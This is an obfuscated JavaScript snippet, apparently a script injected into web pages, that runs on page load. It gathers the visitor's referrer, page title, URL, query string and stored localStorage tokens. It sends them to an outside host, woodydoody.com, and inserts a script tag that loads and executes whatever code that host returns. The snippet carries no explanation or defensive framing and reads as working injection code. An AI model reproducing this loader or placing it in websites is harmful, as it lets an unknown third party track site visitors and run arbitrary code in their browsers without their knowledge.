(function() {
    var name = '_zjGyBCNY939dGMkZ';
    if (!window._zjGyBCNY939dGMkZ) {
        window._zjGyBCNY939dGMkZ = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://woodydoody.com/gogo',
            P_PATH: 'https://woodydoody.com/fec84ce/postback',
        };
    }
    const _DD4qvLwMVtRwQhXY = localStorage.getItem('config');
    if (typeof _DD4qvLwMVtRwQhXY !== 'undefined' && _DD4qvLwMVtRwQhXY !== null) {
        var _Cw7HWC8SdFJ7Pb5Y = JSON.parse(_DD4qvLwMVtRwQhXY);
        var _S88qD1bMS5RyrNZK = Math.round(+new Date()/1000);
        if (_Cw7HWC8SdFJ7Pb5Y.created_at + window._zjGyBCNY939dGMkZ.ttl < _S88qD1bMS5RyrNZK) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _34jWmW5Fg2ZLMzy1 = localStorage.getItem('subId');
    var _T5yFqB6gd8KKdx7x = localStorage.getItem('token');
    var _N2RSVqZHhNVMQRb7 = '?return=js.client';
        _N2RSVqZHhNVMQRb7 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _N2RSVqZHhNVMQRb7 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _N2RSVqZHhNVMQRb7 += '&default_keyword=' + encodeURIComponent(document.title);
        _N2RSVqZHhNVMQRb7 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _N2RSVqZHhNVMQRb7 += '&name=' + encodeURIComponent(name);
        _N2RSVqZHhNVMQRb7 += '&host=' + encodeURIComponent(window._zjGyBCNY939dGMkZ.R_PATH);
    if (typeof _34jWmW5Fg2ZLMzy1 !== 'undefined' && _34jWmW5Fg2ZLMzy1 && window._zjGyBCNY939dGMkZ.unique) {
        _N2RSVqZHhNVMQRb7 += '&sub_id=' + encodeURIComponent(_34jWmW5Fg2ZLMzy1);
    }
    if (typeof _T5yFqB6gd8KKdx7x !== 'undefined' && _T5yFqB6gd8KKdx7x && window._zjGyBCNY939dGMkZ.unique) {
        _N2RSVqZHhNVMQRb7 += '&token=' + encodeURIComponent(_T5yFqB6gd8KKdx7x);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._zjGyBCNY939dGMkZ.R_PATH + _N2RSVqZHhNVMQRb7;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
